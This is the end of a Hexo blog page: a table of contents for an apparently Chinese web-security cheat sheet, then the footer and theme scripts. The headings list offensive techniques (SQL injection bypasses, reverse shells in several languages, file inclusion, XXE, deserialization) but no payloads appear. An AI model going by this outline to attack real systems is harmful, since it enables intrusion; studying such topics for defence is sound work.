              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#sql注入"><span class="nav-number">1.</span> <span class="nav-text">sql注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#mysql"><span class="nav-number">1.1.</span> <span class="nav-text">mysql</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#基础查询操作"><span class="nav-number">1.1.1.</span> <span class="nav-text">基础查询操作</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#报错注入"><span class="nav-number">1.1.2.</span> <span class="nav-text">报错注入</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#floor"><span class="nav-number">1.1.2.1.</span> <span class="nav-text">floor</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#exp"><span class="nav-number">1.1.2.2.</span> <span class="nav-text">exp</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#extractvalue"><span class="nav-number">1.1.2.3.</span> <span class="nav-text">extractvalue</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#updatexml"><span class="nav-number">1.1.2.4.</span> <span class="nav-text">updatexml</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#NAME-CONST"><span class="nav-number">1.1.2.5.</span> <span class="nav-text">NAME_CONST</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#盲注"><span class="nav-number">1.1.3.</span> <span class="nav-text">盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#布尔盲注"><span class="nav-number">1.1.3.1.</span> <span class="nav-text">布尔盲注</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#时间盲注"><span class="nav-number">1.1.3.2.</span> <span class="nav-text">时间盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#sleep"><span class="nav-number">1.1.3.2.1.</span> <span class="nav-text">sleep</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#BENCHMARK"><span class="nav-number">1.1.3.2.2.</span> <span class="nav-text">BENCHMARK</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#笛卡尔积"><span class="nav-number">1.1.3.2.3.</span> <span class="nav-text">笛卡尔积</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#GET-LOCK"><span class="nav-number">1.1.3.2.4.</span> <span class="nav-text">GET_LOCK</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#rpad-repeat"><span class="nav-number">1.1.3.2.5.</span> <span class="nav-text">rpad/repeat</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#bypass技巧"><span class="nav-number">1.1.4.</span> <span class="nav-text">bypass技巧</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#禁用information-schema"><span class="nav-number">1.1.4.1.</span> <span class="nav-text">禁用information_schema</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#格式化字符串"><span class="nav-number">1.1.4.2.</span> <span class="nav-text">格式化字符串</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#编码绕过"><span class="nav-number">1.1.4.3.</span> <span class="nav-text">编码绕过</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#未知字段名"><span class="nav-number">1.1.4.4.</span> <span class="nav-text">未知字段名</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#花式布尔条件"><span class="nav-number">1.1.4.5.</span> <span class="nav-text">花式布尔条件</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#过滤逗号"><span class="nav-number">1.1.4.6.</span> <span class="nav-text">过滤逗号</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#过滤select"><span class="nav-number">1.1.4.7.</span> <span class="nav-text">过滤select</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#未知表名、不能使用逗号、不能截断的时间盲注绕过"><span class="nav-number">1.1.4.8.</span> <span class="nav-text">未知表名、不能使用逗号、不能截断的时间盲注绕过</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#写shell"><span class="nav-number">1.2.</span> <span class="nav-text">写shell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#反弹shell"><span class="nav-number">2.</span> <span class="nav-text">反弹shell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#bash"><span class="nav-number">2.1.</span> <span class="nav-text">bash</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#python"><span class="nav-number">2.2.</span> <span class="nav-text">python</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php"><span class="nav-number">2.3.</span> <span class="nav-text">php</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#java"><span class="nav-number">2.4.</span> <span class="nav-text">java</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#perl"><span class="nav-number">2.5.</span> <span class="nav-text">perl</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ruby"><span class="nav-number">2.6.</span> <span class="nav-text">ruby</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nc"><span class="nav-number">2.7.</span> <span class="nav-text">nc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#msfvenom"><span class="nav-number">2.8.</span> <span class="nav-text">msfvenom</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#文件包含"><span class="nav-number">3.</span> <span class="nav-text">文件包含</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#LFI"><span class="nav-number">3.1.</span> <span class="nav-text">LFI</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RFI"><span class="nav-number">3.2.</span> <span class="nav-text">RFI</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#常见敏感文件"><span class="nav-number">3.3.</span> <span class="nav-text">常见敏感文件</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#windows"><span class="nav-number">3.3.1.</span> <span class="nav-text">windows</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#linux"><span class="nav-number">3.3.2.</span> <span class="nav-text">linux</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#java-1"><span class="nav-number">3.3.2.1.</span> <span class="nav-text">java</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#系统"><span class="nav-number">3.3.3.</span> <span class="nav-text">系统</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#常规操作"><span class="nav-number">3.4.</span> <span class="nav-text">常规操作</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#php伪协议"><span class="nav-number">3.4.1.</span> <span class="nav-text">php伪协议</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#php-input"><span class="nav-number">3.4.1.1.</span> <span class="nav-text">php://input</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#php-filter"><span class="nav-number">3.4.1.2.</span> <span class="nav-text">php://filter</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#phar"><span class="nav-number">3.4.1.3.</span> <span class="nav-text">phar://</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#zip"><span class="nav-number">3.4.1.4.</span> <span class="nav-text">zip://</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#data-URI-schema"><span class="nav-number">3.4.1.5.</span> <span class="nav-text">data:URI schema</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#包含session"><span class="nav-number">3.4.2.</span> <span class="nav-text">包含session</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#包含日志"><span class="nav-number">3.4.3.</span> <span class="nav-text">包含日志</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#服务器日志"><span class="nav-number">3.4.3.1.</span> <span class="nav-text">服务器日志</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ssh日志"><span class="nav-number">3.4.3.2.</span> <span class="nav-text">ssh日志</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#包含environ"><span class="nav-number">3.4.4.</span> <span class="nav-text">包含environ</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#包含临时文件"><span class="nav-number">3.4.5.</span> <span class="nav-text">包含临时文件</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#绕过姿势"><span class="nav-number">3.5.</span> <span class="nav-text">绕过姿势</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#指定前缀"><span class="nav-number">3.5.1.</span> <span class="nav-text">指定前缀</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#指定后缀"><span class="nav-number">3.5.2.</span> <span class="nav-text">指定后缀</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#姿势一：query-？"><span class="nav-number">3.5.2.1.</span> <span class="nav-text">姿势一：query ？</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#姿势二：fragment"><span class="nav-number">3.5.2.2.</span> <span class="nav-text">姿势二：fragment</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#姿势三：长度截断"><span class="nav-number">3.5.2.3.</span> <span class="nav-text">姿势三：长度截断</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#姿势四：0字节截断"><span class="nav-number">3.5.2.4.</span> <span class="nav-text">姿势四：0字节截断</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#strops-绕过"><span class="nav-number">3.5.3.</span> <span class="nav-text">strops 绕过</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#防御方案"><span class="nav-number">3.6.</span> <span class="nav-text">防御方案</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XXE"><span class="nav-number">4.</span> <span class="nav-text">XXE</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#有回显，直接读文件"><span class="nav-number">4.1.</span> <span class="nav-text">有回显，直接读文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#无回显，引用服务器上的XML文件"><span class="nav-number">4.2.</span> <span class="nav-text">无回显，引用服务器上的XML文件</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#杂项"><span class="nav-number">5.</span> <span class="nav-text">杂项</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#伪造ip"><span class="nav-number">5.1.</span> <span class="nav-text">伪造ip</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#三个MD5相同的不同文件"><span class="nav-number">5.2.</span> <span class="nav-text">三个MD5相同的不同文件</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#靶机渗透"><span class="nav-number">6.</span> <span class="nav-text">靶机渗透</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#php-1"><span class="nav-number">7.</span> <span class="nav-text">php</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#python-反序列化"><span class="nav-number">8.</span> <span class="nav-text">python 反序列化</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Moyu</span>

  
</div>


  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
          <span id="scrollpercent"><span>0</span>%</span>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
